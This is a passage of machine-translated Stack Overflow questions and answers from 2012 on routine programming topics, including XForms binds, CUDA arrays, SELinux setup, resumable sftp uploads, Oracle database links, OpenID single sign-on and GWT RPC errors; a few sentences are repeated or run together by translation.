        <item>2</item>
        <item>3</item>
</xf:instance> 
```

我有一个绑定声明为：

```
<xforms:bind id="items-bind" nodeset="items[instance('Include-model')/value = 'true']"> 
```

该复选框正确更新了包含模型，但绑定不会更新以反映这一点。基本上，如果选中该复选框，我需要显示这些项目，否则隐藏它们。初始状态是正确的，但是当我选中/取消选中复选框时，更改不会反映在绑定中。

永远感谢所有可以提供帮助的人。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T06:12:23.840

首先，我可以看到您在此处提供的代码片段中存在多个问题。

1.  此处缺少结束标记。它应该看起来像

    ```
     <xforms:instance id="items-model">
            <items>
                <item>1</item>
                <item>2</item>
                <item>3</item>
            </items>
        </xforms:instance> 
    ```

2.  提到的绑定中的节点集用于项目。应该是物品。由于没有给出从表单生成器中提取的代码还是“手写”代码的信息，我不能说它是否正确。对于“手写”代码，您的情况下的绑定定义将如下所示

    ```
     <xforms:bind id="items-bind" nodeset="instance('items-model')/item[instance('Include-model')/value = 'true']" /> 
    ```

下面是您可以针对这种情况运行的完整 Xforms 代码。尝试将 value 设置为 'true' 并再次将 value 设置为 'false' 以了解 bind 是如何工作的。

```
<xhtml:html xmlns:xhtml="http://www.w3.org/1999/xhtml"
    xmlns:xxforms="http://orbeon.org/oxf/xml/xforms"
    xmlns:xforms="http://www.w3.org/2002/xforms">

    <xhtml:head>
      <xhtml:title>Xforms</xhtml:title>

      <xforms:model>

        <xforms:instance id="Include-model">
            <data>
                <value type="xs:string">true</value>
            </data>
        </xforms:instance>

        <xforms:instance id="items-model">
            <items>
                <item>1</item>
                <item>2</item>
                <item>3</item>
            </items>
        </xforms:instance>

        <xforms:bind id="items-bind" nodeset="instance('items-model')/item[instance('Include-model')/value = 'true']" />

      </xforms:model>

    </xhtml:head>

    <xhtml:body>

        <table>
            <tr>
                <td>Bind items are
                    <xforms:output value="
                        string-join(xxforms:bind('items-bind'), ' -- ')
                        " />
                </td>
            </tr>
        </table>

    </xhtml:body>

</xhtml:html> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T06:05:47.070

你可以试试

```
<xforms:bind id="items-bind" nodeset="instance('items-model')" relevant="instance('Include-model')/value = 'true'" /> 
```

# c#-4.0 - 移动网站中的 MVC4 Razor 回发问题

> ID：12624280
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:31.527
> 
> 标签：c#-4.0, asp.net-mvc-4

谁能告诉我在 MVC4 Razor for Mobile 中处理回发的方法是什么。

我是 MVC 开发的新手。我搜索了很多，但找不到任何可以在我的项目上运行的示例。

任何有用的链接也将受到重视。

* * *

## 控制器中的代码：

```
//[HttpGet]

public ActionResult TestView()
{
   return View();
}
[HttpPost]
public ActionResult TestView(string action,  UserSelection objSelection)
{
   if (!string.IsNullOrEmpty(action))
   {
   }
   return View();
} 
```

* * *

**编辑：** 在视图中：我添加了两个带有标签的按钮：输入具有名称=操作，但值不同。

当我单击这些按钮时，我收到“错误加载页面”消息。

抱歉：由于此处的过滤器设置，无法加载代码。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T05:08:06.783

解决方案是我创建了新项目并将代码合并到新项目和宾果游戏中。

但我找不到第一个项目的这种行为的原因。

但无论如何，我的项目已经开始处理回发。

# c++ - 你能改变二维数组在 C++/CUDA 中的排序方式吗

> ID：12624282
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:42.387
> 
> 标签：c++, arrays, matrix, cuda

假设我在 CUDA 下的 C++ 中有一个二维数组，存储在共享内存中，如下所示：

```
__shared__ float arr[4][4]; // C++ has a default row-major ordering 
```

默认情况下，C++ 将以`arr`行优先格式对元素进行排序。

也就是说，它将分配一个连续的内存块并存储像这样的元素 (0,0), (0,1), (0,2), (0,3), (1,0), (1,1 ）， ... 等等...

有没有办法告诉 C++/CUDA 编译器以列优先顺序排列它？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-27T15:08:13.240

你为什么不直接交换你正在使用的索引呢？

而不是使用`arr[x][y]`use `arr[y][x]`。

有趣的是你为什么要这样做。也许使用缓存内存可能会有所帮助，但如果没有详细信息，我无法确定。

希望它有所帮助。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:07:43.133

转置矩阵。`arr[4][4]`表示这`arr`是一个由 4 个大小为 4 的数组组成的数组。以“行优先”顺序存储值的原因是`arr[0]`，例如，必须给我们指向这四个数组中第一个数组的指针，以及单个数组的元素应该放置在连续的内存位置，以便可以通过将索引添加到唯一标识符来单独引用它们。

# ubuntu - SELinux 安装

> ID：12624284
> 
> 赞同：1
> 
> 时间：2012-09-27T14:56:50.107
> 
> 标签：ubuntu, selinux

我正在尝试在 Ubuntu 11.04 上使用`apt-get`.

当我尝试时：

```
$ sudo apt-get install selinux 
```

我收到以下错误：

> 以下软件包具有未满足的依赖关系：
> selinux : PreDepends: grub-pc 但它不可安装
> E: 损坏的软件包

然后我下载了`selinux-utils`，`selinux-basics`.

在此之后，我检查了`selinux`下面的文件，`/etc/sysconfig`但我找不到它。

另外，当我尝试

```
$ setenforce 1 
```

它返回：

> setenforce：SELinux 被禁用

有什么依赖关系？我应该下载什么？我该如何解决这个问题？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-12-19T21:32:53.123

我建议卸载 AppArmor，因为它可能与 SELinux 冲突：

移除 apparmor
移除 apparmor-util

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-10-28T18:56:47.280

在 Linux 发行版下运行 SELinux 需要三件事：支持 SELinux 的内核、SELinux 用户空间工具和库以及 SELinux 策略。我猜您的内核是在未启用 SELinux 选项的情况下编译的，和/或与您的引导加载程序（grub-pc）相关的问题。 [这](https://www.kernel.org/doc/Documentation/security/SELinux.txt)是来自内核文档。

> > 如果你想使用 SELinux，你可能会想使用发行版提供的策略，或者从 [http://oss.tresys.com/projects/refpolicy安装最新的参考策略版本](http://oss.tresys.com/projects/refpolicy)
> 
> 但是，如果您想安装一个虚拟策略进行测试，您可以使用 scripts/selinux 下提供的“mdp”。请注意，这需要安装 selinux 用户空间 - 特别是您将需要 checkpolicy 来编译内核，并需要 setfiles 和 fixfiles 来标记文件系统。
> 
> 1.  在启用 selinux 的情况下编译内核。
> 2.  键入“make”编译 mdp。
> 3.  确保您没有在启用 SELinux 和真实策略的情况下运行。如果是，请在禁用 selinux 的情况下重新启动，然后再继续。
> 4.  运行 install_policy.sh： cd scripts/selinux sh install_policy.sh
> 
> 第 4 步将创建一个对您的内核有效的新虚拟策略，其中包含一个 selinux 用户、角色和类型。它将编译策略，将您的 SELINUXTYPE 在 /etc/selinux/config 中设置为 dummy，将编译后的策略安装为“dummy”，并重新标记您的文件系统。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-06-16T12:16:32.680

看起来你没有 GRUB（引导加载程序）。我猜 SELinux 需要对内核进行一些更改，因此请使用 GRUB 安装您的系统。比仅通过 'apt-get install selinux' 安装 SELinux 是正确的。

# java - 通过调用 shell 脚本上传多个文件

> ID：12624285
> 
> 赞同：0
> 
> 时间：2012-09-27T14:56:52.557
> 
> 标签：java, sftp

我有一个使用 Core java 和 Spring 2.5 的框架，它在 unix 环境中调用一些 sftp 脚本来将文件上传到目标服务器。截至目前，它仅支持每次调用 1 个文件上传。我负责增强框架，使其支持多个文件上传。但是，对于要 sftp 的多个文件，如果由于某种原因，脚本在 sfting 较少数量的文件后失败，则程序的下一次调用应该只尝试 sftp 剩余的文件（作为附加功能，而不是重试所有文件）。例如。假设在第一次调用时，程序应该 sftp 5 个文件，并且在 sftp 2 个文件后失败，那么应该有一个选项可以在下一次调用中只 sftp 剩余的 3 个文件。作为一种可能的解决方案，我有多种选择，例如更新一些缓存条目或更新数据库表，但这是不允许的解决方案（到目前为止，我还没有花太多时间争论原因）。我可以想到另一种解决方案 - 写入文件，成功 sftped 的文件的名称并继续处理剩余的文件。然而，这似乎是一种更粗略的解决方案，我正在考虑一个更好的解决方案，它应该足够通用。您能否为这种情况提供一些更好的设计建议？请注意，对于所有这些 sftp，目标服务器不会将任何信息发送回源服务器。成功 sftped 的文件的名称并继续处理剩余的文件。然而，这似乎是一种更粗略的解决方案，我正在考虑一个更好的解决方案，它应该足够通用。您能否为这种情况提供一些更好的设计建议？请注意，对于所有这些 sftp，目标服务器不会将任何信息发送回源服务器。成功 sftped 的文件的名称并继续处理剩余的文件。然而，这似乎是一种更粗略的解决方案，我正在考虑一个更好的解决方案，它应该足够通用。您能否为这种情况提供一些更好的设计建议？请注意，对于所有这些 sftp，目标服务器不会将任何信息发送回源服务器。

问候， 拉马坎特

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-27T15:31:37.343

您是否尝试过引发包含未正确 sftp 的文件的异常？

异常类可能如下所示：

```
import java.io.File;

public class SFTPBulkFailedTransportException extends RuntimeException {

    public SFTPBulkFailedTransportException(File[] untransmittedFiles){
        setUntransmittedFiles(untransmittedFiles);
    }

    public File[] getUntransmittedFiles() {
        return this.untransmittedFiles;
    }

    private void setUntransmittedFiles(File[] untransmittedFiles) throws IllegalArgumentException {
        this.untransmittedFiles = untransmittedFiles;
    }

    private File[] untransmittedFiles;

} 
```

如果您对所有未传输的文件抛出此异常，则在捕获此异常时您可以访问它们。在批量传输文件的方法中会抛出此异常。

如果你把它们放在一起：

```
import java.util.ArrayList;
import java.util.List;

File[] filesToSend; // all files to send

 while(filesToSend.length != 0){

        try{
            sendbulk(filesToSend);
        }catch(SFTPBulkFailedTransportException exception){
            // assign failed files to filesToSend
            // because of the while loop, sendbulk is invoked again
            filesToSend = exception.getUntransmittedFiles();
    }
}

public void sendbulk(File[] filesToSend) throws SFTPBulkFailedTransportException{

    List<File> unsuccesfullFiles = new ArrayList<File>();

    for(File file : filesToSend){
        try{
            sendSingle(file);
        }catch(IllegalArgumentException exception){
            unsuccesfullFiles.add(file);
        }
    }

    if(!unsuccesfullFiles.isEmpty()){
        throw new SFTPBulkFailedTransportException( (File[]) unsuccesfullFiles.toArray());
    }
}

public void sendSingle(File file) throws IllegalArgumentException{
    // I am not sure if this is the right way to execute a command for your situation, but
    // you can probably check the exit status of the sftp command (0 means successful)
    String command = "REPLACE WITH SFTP COMMAND";
    Process child = Runtime.getRuntime().exec(command);

    // if sftp failed, throw exception
    if(child.exitValue() != 0){
        throw new IllegalArgumentException("ENTER REASON OF FAILURE HERE");
    }
} 
```

我希望这有帮助。

# dozer - Dozer - 将类字段映射到平面表示

> ID：12624286
> 
> 赞同：2
> 
> 时间：2012-09-27T14:57:06.113
> 
> 标签：dozer

我一直在谷歌搜索并尝试不同的推土机配置选项，但到目前为止找不到简单的解决方案......问题如下：

```
class A {
 String test;
 B test2;
}
class B {
 String test3;
 String test4;
}

class C {
 String test;
 String test3;
 String test4;
} 
```

现在我想将 A（包括 B）中的所有字段映射到 C 中的平面表示。是否可以仅使用配置来映射它？问题是我需要在许多不同的类中映射 B 并且我不想为每个类编写这样的映射：

```
<mapping>
    <class-a>A</class-a>
    <class-b>C</class-b>
    <field>
        <a>test2.test3</a>
        <b>test3</b>
    </field>
    <field>
        <a>test2.test4</a>
        <b>test4</b>
    </field>
</mapping> 
```

希望有一个解决方案:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-04T04:37:23.283

在推土机常见问题解答中找到：

我可以将一个字段映射到另一个在目标对象中嵌套 n 层的字段吗？

是的。Dozer 支持嵌套字段的点表示法。与其他推土机场映射一样，这些是双向的。

```
<field>
  <a>someNestedObj.someOtherNestedObj.someField</a>
  <b>someOtherField</b>
</field> 
```

[推土机常见问题](http://dozer.sourceforge.net/documentation/faq.html#mult-fields-to-single-field)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-10-03T19:00:46.473

诀窍是使用映射 ID 和“this”。您只需要定义一次 caseB 并且可以重复使用它。

```
<mapping map-id="caseB">
    <class-a>B</class-a>
    <class-b>C</class-b>
    <field>
        <a>test3</a>
        <b>test3</b>
    </field>
    <field>
        <a>test4</a>
        <b>test4</b>
    </field>
</mapping>
<mapping>
    <class-a>A</class-a>
    <class-b>C</class-b>
    <field map-id="caseB">
        <a>test2</a>
        <b>this</b>
    </field>
</mapping> 
```

# facebook - 要求用户进行身份验证时，Facebook 应用程序无法识别扩展权限

> ID：12624290
> 
> 赞同：1
> 
> 时间：2012-09-27T14:57:10.607
> 
> 标签：facebook, permissions

请参阅随附的屏幕截图。我已经为 publish_actions（以及 publish_stream）配置了权限，并且收到错误消息：当我尝试对应用程序进行身份验证时需要扩展权限。奇怪的是，当要求用户进行身份验证时，并没有请求这些权限。

![权限](../Images/73005c9570c7ff2d257a6dceea7b91f1.png)

![错误](../Images/29464eb43a199e4588276f57e4bb4a0c.png)

干杯

保罗

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T16:38:34.367

应用程序设置中询问的权限 --> 权限 --> '配置您的权限' 部分仅显示在应用程序中心或使用 Auth Referrals 时。要在正常身份验证流程中显示权限（在权限对话框中），您需要使用代码中的“范围”参数询问他们（https://developers.facebook.com/docs/reference/dialogs/oauth/）。希望有帮助。

# database - 如何使用位于不同模式中的 DBLINK 在 Oracle 中选择？

> ID：12624291
> 
> 赞同：14
> 
> 时间：2012-09-27T14:57:10.483
> 
> 标签：database, oracle, database-schema, dblink

我们有一个 Oracle DBMS (11g) 和以下配置：

*   数据库用户“MYUSER”
*   两个模式“MYUSER”和“SCHEMA_B”
*   用户“MYUSER”可以访问“SCHEMA_B”并对其表具有读取权限
*   位于“SCHEMA_B”中的公共数据库链接“DB_LINK”
*   直接使用 DB 用户“SCHEMA_B”时，DB_LINK 正在工作

**问题**：以“MYUSER”身份登录时，使用“SCHEMA_B”的 DB 链接访问表的正确语法是什么？有可能这样做吗？

我已经尝试了几个星座，但都不起作用：

```
select * from dual@"DB_LINK"
select * from dual@"SCHEMA_B"."DB_LINK"
select * from dual@SCHEMA_B."DB_LINK"
select * from dual@SCHEMA_B.DB_LINK
select * from SCHEMA_B.dual@DB_LINK
select * from "SCHEMA_B".dual@DB_LINK 
```

我收到的错误消息是：ORA-02019。00000 - “未找到远程数据库的连接描述”

感谢您的任何建议！

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-09-27T15:28:53.380

我认为不可能在多个用户之间共享数据库链接，但不是全部。它们要么是私有的（仅适用于一个用户），要么是公共的（适用于所有用户）。

解决此问题的一个好方法是在 SCHEMA_B 中创建一个视图，该视图公开您要通过数据库链接访问的表。这也将使您可以很好地控制允许从数据库链接中选择的人员，因为您可以控制对视图的访问。

这样做：

```
create database link db_link... as before;
create view mytable_view as select * from mytable@db_link;
grant select on mytable_view to myuser; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-12-23T00:28:01.217

我使用上面提供的解决方案时遇到了同样的问题 - 我删除了 SYNONYM，创建了一个与同义词同名的 VIEW。它有一个使用 dblink 的选择，并将 GRANT SELECT 提供给另一个模式它工作得很好。

# delphi - 来自 Delphi IDE 的“参数列表不兼容”消息是否有解决方法？

> ID：12624306
> 
> 赞同：4
> 
> 时间：2012-09-27T14:57:58.890
> 
> 标签：delphi, ide, delphi-2009, ambiguity

请考虑这个简化的例子：

```
type
  TForm43 = class(TForm)
    drwgrd1: TDrawGrid;
    procedure drwgrd1DrawCell(Sender: TObject; ACol, ARow: Integer; 
      Rect: Windows.TRect; State: TGridDrawState);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

procedure TForm43.drwgrd1DrawCell(Sender: TObject; ACol, ARow: Integer;
  Rect: Windows.TRect; State: TGridDrawState);
begin
  Rect.Left := 5;
end; 
```

在方法`drwgrd1DrawCell`中，我已明确用于解决在两个不同单元中定义的`Windows.TRect`歧义。`TRect`一切正常，代码正在编译。但是每次保存上述单元时，我都会从 Delphi IDE 中收到一个问题，询问：“ *drwgrd1.OnDrawCell 引用的 drwgrd1DrawCell 方法具有不兼容的参数列表。删除引用？* ”

这很烦人。有什么方法可以关闭此消息对话框或以不显示的方式编写我的代码？不幸的是，我无法更改我`TRect`的 for`TRect2`或类似的东西。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T20:19:22.513

您可以在表单声明上方添加以下类型声明：

```
 type
      TRect = Windows.TRect; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-27T16:24:47.553

保存表单时出现错误的原因是因为 Delphi 比较了所有事件处理程序的声明，以确保它们的声明与其继承的实现完全相同。添加`Windows.`到声明中会使比较失败。

如果在声明的子句中将单位移到另一个单位之后，则可以删除`Windows.`from 。这是因为 Delphi从最后一个到第一个处理子句中的单元。它将使用它找到的第一个实例...`drwgd1DrawCell()``Windows``uses``TRect``uses``TRect`

# sql-server - 要在网格中显示的表单详细信息

> ID：12624308
> 
> 赞同：0
> 
> 时间：2012-09-27T14:58:08.937
> 
> 标签：sql-server, delphi, datagridview, tcxgrid

我有基本的问题，因为我是 Delphi XE2 的初学者。

我正在使用 VCL 表单并在编辑框中输入表单详细信息，并通过添加、删除和更新/检索等几个基本操作显示在网格中。而详细信息必须保存在 SQL 服务器中。

如果我稍后使用该表单，我需要 SQL 网格中的先前数据。对于这些操作，我的更新/检索字段操作必须在 Delphi 或 SQL 服务器上完成。

希望每个人都会遇到这些基本形式。所以帮助我。

提前致谢。

问候，拉詹。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T07:37:30.490

[http://docwiki.embarcadero.com/RADStudio/en/Developing_Database_Applications](http://docwiki.embarcadero.com/RADStudio/en/Developing_Database_Applications)

[http://docwiki.embarcadero.com/RADStudio/en/Developing_Database_Applications_Index](http://docwiki.embarcadero.com/RADStudio/en/Developing_Database_Applications_Index)

这些是有关使您的应用程序连接到数据库的基本主题。

* * *

ExpressQuantumGrid 本身是一个非常复杂且昂贵的控件，它没有在线帮助但确实有离线帮助，并且有“基于任务的帮助/连接到数据”部分涵盖了您对特定网格的需求。您真的使用[tcxgrid](/questions/tagged/tcxgrid "显示标记为“tcxgrid”的问题")组件还是只是随意猜测该标签？你说你没有 Delphi 经验，但你真的购买了 DevArt 库吗？它的价格可能几乎和 Delphi 本身一样大？如果你这样做了，你可以尝试打开他们的[VCL 演示](http://www.devexpress.com/Support/training-demos.xml)并阅读他们的源代码，它们是如何实现的。

# openid - 了解与 OpenID 相关的单点登录

> ID：12624316
> 
> 赞同：0
> 
> 时间：2012-09-27T14:58:25.380
> 
> 标签：openid, single-sign-on

我不确定我是否正确理解 SSO。我认为主要的想法是为许多网站只有一个用户名/密码。SSO 的另一个想法是只登录一次，这样您就可以使用具有相同 SSO 机制的所有其他站点而无需再次登录。第一个目标肯定是由 OpenID 实现的。但是第二个呢？如果我使用 facebook 登录 stackoverflow，我将不会自动登录到也使用 facebook 登录的其他网站，对吗？那么，如果您有一个 OpenID，您是否总是需要为每个站点输入您的用户名和密码？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T18:08:51.137

你对主要思想是正确的。openID 的优势恰恰在于——能够重用凭证。

基本过程很简单（使用您使用 Facebook 登录 StackOverflow 的示例）。

1.  你访问stackoverflow。
2.  你说“我是 Facebook 上的 CommanderData”。
3.  Stackoverflow 说“真的吗？证明它！” - 然后它转到 facebook 并询问“这家伙真的是 Facebook 上的 CommanderData 吗？”
4.  如果您已经在 facebook 上登录，facebook 会回复“是的，他实际上是 facebook 上的 CommanderData”，现在 StackOverflow 可以让您登录，知道您就是您在 facebook 上所说的那个人。如果您没有登录 facebook，facebook 应该让您有机会通过登录 facebook 来证明您是 CommanderData，然后它会回复 StackOverflow。

所以回答您的问题：如果您使用 facebook 登录 SO，您将不会自动使用 Facebook OpenId 登录到任何其他网站。但是，如果您已登录 facebook，则不必每次都登录 facebook，因为 facebook 已经知道您是谁，并且可以告诉 RP（依赖方，在您的示例中为 StackOverflow）您是谁。

至于您的评论：我不相信 OpenId 使用跨域 cookie。它发出在双方（EP 和 RP）上都经过验证的单个 Web 请求，然后两者之间不再有通信。StackOverflow 实际上并没有读取您的 facebook 授权 cookie。

您可能会发现[此演示文稿内容](http://www.slideshare.net/daveman692/openid-bootcamp-tutorial)丰富。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-10-02T11:30:49.760

您对 SSO 的理解是正确的。是的，您可以使用 OpenID 实现 SSO，对于 Facebook，您没有使用 OpenID 登录 StackOverflow，它的 OAuth。

使用 OpenID 实现 SSO 的方法不是使用跨域 cookie，而是使用在 OpenID Provider 域中设置的 cookie。因此，每个用户都被 SP 重定向到 OP，OP 看到这个 cookie 并识别出这个用户已经登录并且有一个有效的会话，所以用户将立即被重定向回 RP 而没有任何身份验证挑战。

# php - 当用户点击播放时，在同一网页上打开视频弹出窗口

> ID：12624317
> 
> 赞同：0
> 
> 时间：2012-09-27T14:58:30.327
> 
> 标签：php, javascript, jquery, html, css

```
 <div class="player"><iframe src="http://player.vimeo.com/video/<?= $vimeo;?>?title=0&amp;byline=0&amp;portrait=0&amp;color=abcc16&amp;autoplay=0" width="150" height="150" frameborder="0" webkitAllowFullScreen allowFullScreen></iframe></div> 
```

当我单击 html 页面上显示的视频的播放按钮时，如何在同一页面上打开一个带有交叉（x）的弹出窗口？并且它必须在用户点击它之前在视频窗口上显示观看视频。我目前在 php 中使用上述代码在浏览器中显示框架窗口。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T15:02:16.003

jquery + colorbox 插件[http://www.jacklmoore.com/colorbox](http://www.jacklmoore.com/colorbox)

打开一个包含“观看视频”消息的颜色框弹出窗口。添加`click`用视频 iframe 替换消息的处理程序。

# gwt - 在 GWT 中获取 com.google.gwt.user.client.rpc.StatusCodeException: 0

> ID：12624320
> 
> 赞同：10
> 
> 时间：2012-09-27T14:58:47.920
> 
> 标签：gwt, gwt-rpc, gxt, cloudflare

我有时/经常在 GWT 中得到这个异常，但不知道为什么：

```
SEVERE: com.google.gwt.user.client.rpc.StatusCodeException: 0 
java.lang.RuntimeException: com.google.gwt.user.client.rpc.StatusCodeException: 0 
    at Unknown.java_lang_RuntimeException_RuntimeException__Ljava_lang_Throwable_2V(Unknown Source)
    at Unknown.de_ctech24_simplynews_web_client_util_SimpleCallback_$onFailure__Lde_ctech24_simplynews_web_client_util_SimpleCallback_2Ljava_lang_Throwable_2V(Unknown Source)
    at Unknown.com_google_gwt_user_client_rpc_impl_RequestCallbackAdapter_$onResponseReceived__Lcom_google_gwt_user_client_rpc_impl_RequestCallbackAdapter_2Lcom_google_gwt_http_client_Request_2Lcom_google_gwt_http_client_Response_2V(Unknown Source)
    at Unknown.com_google_gwt_http_client_Request_$fireOnResponseReceived__Lcom_google_gwt_http_client_Request_2Lcom_google_gwt_http_client_RequestCallback_2V(Unknown Source)
    at Unknown.com_google_gwt_http_client_RequestBuilder$1_onReadyStateChange__Lcom_google_gwt_xhr_client_XMLHttpRequest_2V(Unknown Source)
    at Unknown.<anonymous>(Unknown Source)
    at Unknown.com_google_gwt_core_client_impl_Impl_apply__Ljava_lang_Object_2Ljava_lang_Object_2Ljava_lang_Object_2Ljava_lang_Object_2(Unknown Source)
Caused by: com.google.gwt.user.client.rpc.StatusCodeException: 0 
    at Unknown.java_lang_RuntimeException_RuntimeException__Ljava_lang_String_2Ljava_lang_Throwable_2V(Unknown Source)
    at Unknown.com_google_gwt_user_client_rpc_StatusCodeException_StatusCodeException__ILjava_lang_String_2V(Unknown Source)
    at Unknown.com_google_gwt_user_client_rpc_impl_RequestCallbackAdapter_$onResponseReceived__Lcom_google_gwt_user_client_rpc_impl_RequestCallbackAdapter_2Lcom_google_gwt_http_client_Request_2Lcom_google_gwt_http_client_Response_2V(Unknown Source)
    at Unknown.com_google_gwt_http_client_Request_$fireOnResponseReceived__Lcom_google_gwt_http_client_Request_2Lcom_google_gwt_http_client_RequestCallback_2V(Unknown Source)
    at Unknown.com_google_gwt_http_client_RequestBuilder$1_onReadyStateChange__Lcom_google_gwt_xhr_client_XMLHttpRequest_2V(Unknown Source)
    at Unknown.<anonymous>(Unknown Source)
    at Unknown.com_google_gwt_core_client_impl_Impl_apply__Ljava_lang_Object_2Ljava_lang_Object_2Ljava_lang_Object_2Ljava_lang_Object_2(Unknown Source) 
```

花了一些时间谷歌搜索后，我发现了这个： http: [//www.mail-archive.com/google-web-toolkit@googlegroups.com/msg79537.html](http://www.mail-archive.com/google-web-toolkit@googlegroups.com/msg79537.html)

给出了一个有趣的提示：如果您**断开 WLAN 并重新连接，**就会发生这种情况- 然后会出现错误。我在我的笔记本上试过这个 - 然后出现异常。

**另一个问题是有时会出现**此异常（并非总是同时或执行特定操作时 -**看起来很随机**）**，尽管网络连接很好**。我不知道为什么会发生这种情况，也不知道处理它的正确方法是什么——当然我可以抓住并忽略它。但是请求永远不会到达服务器并且操作没有被执行——不是一个很好的错误处理。

关于这个应用程序的一些数据 - 也许这有助于缩小或希望解决问题：

*   GWT 2.4 与 Sencha GXT 3.0.1
*   出现在最新版本的所有顶级浏览器上：IE、Chrome、Firefox
*   使用[Cloudflare](http://www.cloudflare.com)（**我也尝试过不使用它 - 但这是同样的问题。所以这似乎不是由使用此代理服务引起的。**）

非常感谢每一个提示和每一个想法如何处理/解决这个问题。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-27T16:49:04.410

由于没有 HTTP 状态代码 0，这似乎不是来自服务器 - 使用 Firebug 或其他东西进行测试可能是值得的，只是为了确保没有像这样的错误响应返回。

相反，这几乎可以肯定是来自浏览器本身，或者连接超时或被服务器丢弃，或者浏览器无法访问服务器（错误的 dns、错误的网关、丢失的 wifi、服务器不可用）。

将此视为任何意外的服务器故障 - 可能退出并重试，向用户显示消息，记录错误并在连接再次工作时发送。

它发生在所有浏览器中的事实表明存在网络或服务器问题 - 所有浏览器都以不可预知的方式一起失败是极不可能的。这一事实也使调试变得更容易——您可以使用您喜欢的浏览器的调试工具。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-05-01T20:17:29.770

如果我们的身份验证层确定会话已过期并将 RPC 请求重定向到不同主机上的登录页面，就会发生这种情况。由于 AJAX 请求无法转到其他主机，因此浏览器中止请求并发出状态码 0。请参阅[https://code.google.com/p/google-web-toolkit/issues/detail?id=2858](https://code.google.com/p/google-web-toolkit/issues/detail?id=2858)

它也很疯狂，因为 GWT 会抛出一个带有代码 0 的 StatusCodeException，即使出现在 Firebug / Chrome Inspector 中的 HTTP 代码显然是 302。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-04T19:21:13.427

尽管原始发布者的网络连接可能存在问题，但我今天在 GWT 托管模式下遇到了同样的错误。而且不是有时，而是一直。

我现在已经弄清楚了，我想在这里分享它，以便其他寻找 0 状态码问题的解决方案的人可以找到它。

如果您使用 GWT 提供的 Rpc 安全令牌（如本说明： http: [//www.gwtproject.org/doc/latest/DevGuideSecurityRpcXsrf.html](http://www.gwtproject.org/doc/latest/DevGuideSecurityRpcXsrf.html)）对抗跨站点脚本，但您出于某种原因忘记设置安全令牌您可能会遇到的一件事是零结果。

我设计了我的 web 应用程序，以便大多数 RPC 调用主要在框架内进行。今天我需要手动创建一个 RPC 服务。忘记设置 RPCToken，得到服务器的空响应。

希望这可以帮助某人。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-11-01T23:41:59.103

我发现，如果您在服务器（Thread.wait()）上挂起一个 rpc 调用并且浏览器被刷新，那么在客户端再次加载页面之前，它将调用上述等待回调的 onFailure 方法提到的状态代码表明它起源于客户端，或者它是非特定捕获异常的通用错误代码。

# mysql - 更新Mysql查询优化

> ID：12624322
> 
> 赞同：1
> 
> 时间：2012-09-27T14:58:55.627
> 
> 标签：mysql, sql, database

我必须创建一个包含大量查询（大约 150,000 个）的 mysql 查询

目前的查询是：

```
UPDATE table SET activated=NULL
WHERE (
        id=XXXX
    OR  id=YYYY 
    OR  id=ZZZZ 
    OR  id=...
    ...
)
AND activated IS NOT NULL 
```

你知道最好的方法吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-27T15:38:02.723

如果您谈论的是数千个项目，那么一个`IN`子句可能不起作用。在这种情况下，您可能希望将项目插入到临时表中，然后加入它以进行更新，如下所示：

```
UPDATE table tb
JOIN temptable ids ON ids.id = tb.id
SET tb.activated = NULL 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-27T15:17:49.350

```
UPDATE table 
SET activated = NULL
WHERE id in ('XXXX', 'YYYY', 'zzzz')
AND activated IS NOT NULL 
```

# javascript - 删除onbeforeunload提示框

> ID：12624323
> 
> 赞同：0
> 
> 时间：2012-09-27T14:58:57.093
> 
> 标签：javascript, dom-events, onbeforeunload

> **可能重复：**
> [如何使用 javascript 删除卸载事件提示](https://stackoverflow.com/questions/6042071/how-to-remove-prompt-on-unload-event-using-javascript)

我正在开发一个运行 onbeforeunload 和 onunload 的 Javascript，现在脚本通常运行良好，但是在 IE 和 Firefox 上，它会运行一个提示，询问您是否要离开，无论您选择什么选择，其余代码都会执行仍然。现在在 Chrome 和 Safari 上它没有这个问题。我试图弄清楚为什么 IE 和 Firefox 会这样做，并尝试将其从一起显示提示框中删除。如果有帮助，这是我的代码：

```
var leave_message = document.getElementById("kioskform:broswerCloseSubmit");
var leave_safari = document.getElementById("kioskform:broswerCloseSafari");

function goodbye(e) {
    if (!validNavigation) {
        if (dont_confirm_leave!==1) {
            leave_message.click();
            if(!e) e = window.event;

            //e.cancelBubble is supported by IE - this will kill the bubbling process.
            e.cancelBubble = true;
            e.returnValue = leave_message.click();

            //e.stopPropagation works in Firefox.
            if (e.stopPropagation) {
                e.stopPropagation();
                e.preventDefault();
            }

            //return works for Chrome and Safari
            //canceling this makes IE work well but not make Safari work at all.
            leave_safari.click();
        }
    }
}

window.onbeforeunload=goodbye;
window.onunload=leave; 

function leave() {
